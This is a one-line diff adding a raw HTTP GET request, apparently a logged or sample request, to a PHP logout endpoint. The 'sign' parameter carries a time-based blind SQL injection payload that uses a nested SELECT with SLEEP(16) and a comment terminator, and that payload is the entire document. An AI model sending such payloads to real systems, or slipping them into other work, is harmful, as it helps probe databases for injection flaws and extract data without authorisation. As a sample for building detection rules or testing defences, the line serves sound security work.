@@ -1,0 +1,1 @@
+GET /custom/zx/logout.php?sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(16)))Vgsc)--+qhh HTTP/1.1
